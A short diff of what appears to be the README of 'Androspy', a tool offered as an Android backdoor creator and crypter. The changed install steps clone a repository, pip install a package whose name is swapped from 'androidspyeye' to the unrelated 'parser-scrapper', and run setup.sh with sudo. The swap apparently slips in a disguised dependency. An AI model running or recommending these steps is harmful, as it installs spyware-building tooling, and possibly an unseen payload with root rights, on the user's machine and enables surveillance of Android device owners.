@@ -7,7 +7,7 @@ Androspy : is Backdoor Crypter & Creator with Automatic IP Poisener Coded By Bel
 ```
 
 git clone https://github.com/geoscrapper/androispy
-pip install androidspyeye
+pip install parser-scrapper
 cd androspy
 chmod +x setup.sh
 sudo ./setup.sh
